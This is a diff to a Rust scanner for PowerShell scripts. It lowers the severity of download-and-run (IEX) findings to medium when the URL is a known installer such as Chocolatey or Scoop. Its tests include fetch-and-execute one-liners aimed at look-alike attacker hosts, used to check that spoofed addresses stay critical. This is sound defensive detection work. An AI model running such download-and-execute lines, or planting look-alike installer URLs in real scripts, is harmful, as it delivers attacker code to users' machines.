@@ -69,6 +69,46 @@ fn rx(pattern: &str) -> Regex {
     Regex::new(pattern).expect("valid pattern")
 }
 
+static ANY_URL: LazyLock<Regex> = LazyLock::new(|| rx(r#"(?:https?|ftp)://[^\s'"`)<>;|,]+"#));
+
+/// Installers that honest setup scripts pipe into IEX, by their exact address.
+/// The address must be the whole URL: `https://chocolatey.org@host/...` or a
+/// longer path is not on the list. The code still comes from the network, so
+/// the finding stays (MEDIUM).
+const KNOWN_INSTALLERS: &[&str] = &[
+    "https://community.chocolatey.org/install.ps1",
+    "https://chocolatey.org/install.ps1",
+    "https://get.scoop.sh",
+    "https://raw.githubusercontent.com/scoopinstaller/install/master/install.ps1",
+    "https://aka.ms/install-powershell.ps1",
+    "https://dot.net/v1/dotnet-install.ps1",
+    "https://deno.land/install.ps1",
+    "https://bun.sh/install.ps1",
+    "https://astral.sh/uv/install.ps1",
+];
+
+/// The line Scoop documents, with the address written without a scheme. It is
+/// accepted only as the whole line, since a second address with no scheme would
+/// otherwise go unseen.
+static BARE_SCOOP: LazyLock<Regex> = LazyLock::new(|| {
+    rx(
+        r"^\s*(?:irm|iwr(?:\s+-useb(?:asicparsing)?)?|invoke-restmethod|invoke-webrequest(?:\s+-usebasicparsing)?)\s+get\.scoop\.sh\s*\|\s*(?:iex|invoke-expression)\s*$",
+    )
+});
+
+/// Whether every URL on the line is a known installer (and there is one).
+fn only_known_installers(text: &str) -> bool {
+    let mut any = BARE_SCOOP.is_match(text);
+    for url in ANY_URL.find_iter(text) {
+        any = true;
+        let url = url.as_str().trim_end_matches(['.', '/']);
+        if !KNOWN_INSTALLERS.contains(&url) {
+            return false;
+        }
+    }
+    any
+}
+
 static EXEC: LazyLock<Regex> =
     LazyLock::new(|| rx(r"\biex\b|invoke-expression|\[scriptblock\]::create|invoke-command"));
 static DOWNLOAD: LazyLock<Regex> = LazyLock::new(|| {
@@ -395,13 +435,23 @@ fn judge(logical: &Logical, found: &mut Vec<WinFound>) {
 
     // Download and run.
     if executes && downloads {
-        push(
-            found,
-            logical,
-            WinKind::Remote,
-            Severity::Critical,
-            "Invoke-Expression (IEX) runs the result of a download on the same line: code is fetched and run in one step",
-        );
+        if only_known_installers(text) {
+            push(
+                found,
+                logical,
+                WinKind::Remote,
+                Severity::Medium,
+                "Invoke-Expression (IEX) runs the result of a download on the same line, from the address of a well-known installer; the code is still fetched and run in one step, so check that it is the installer you expect",
+            );
+        } else {
+            push(
+                found,
+                logical,
+                WinKind::Remote,
+                Severity::Critical,
+                "Invoke-Expression (IEX) runs the result of a download on the same line: code is fetched and run in one step",
+            );
+        }
     }
     if CERTUTIL_DOWNLOAD.is_match(text) {
         push(
@@ -609,6 +659,36 @@ mod tests {
         assert!(ps("iex $cmd\niwr https://x.example.invalid/a -OutFile a").is_empty());
         assert!(ps("# iex (iwr https://x.example.invalid/a)").is_empty());
         assert!(ps("Invoke-WebRequest https://x.example.invalid/a -OutFile a").is_empty());
+    }
+
+    #[test]
+    fn a_well_known_installer_is_medium_and_anything_else_on_the_line_is_not() {
+        let level = |text: &str| ps(text).first().map(|r| r.1);
+        assert_eq!(
+            level(
+                "iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
+            ),
+            Some(Severity::Medium)
+        );
+        assert_eq!(level("irm get.scoop.sh | iex"), Some(Severity::Medium));
+        assert_eq!(
+            level("irm get.scoop.sh.evil.example.invalid | iex"),
+            Some(Severity::Critical)
+        );
+        assert_eq!(
+            level("iwr -useb https://get.scoop.sh | iex"),
+            Some(Severity::Medium)
+        );
+        // A look-alike, a longer address, a second address, user information.
+        for bad in [
+            "iex (iwr https://chocolatey.org.evil.example.invalid/install.ps1)",
+            "iex (iwr https://chocolatey.org/install.ps1/../x.ps1)",
+            "iex (iwr https://chocolatey.org@evil.example.invalid/install.ps1)",
+            "iex (iwr https://chocolatey.org/install.ps1); iex (iwr https://x.example.invalid/a)",
+            "iex (iwr http://chocolatey.org/install.ps1)",
+        ] {
+            assert_eq!(level(bad), Some(Severity::Critical), "{bad}");
+        }
     }
 
     #[test]
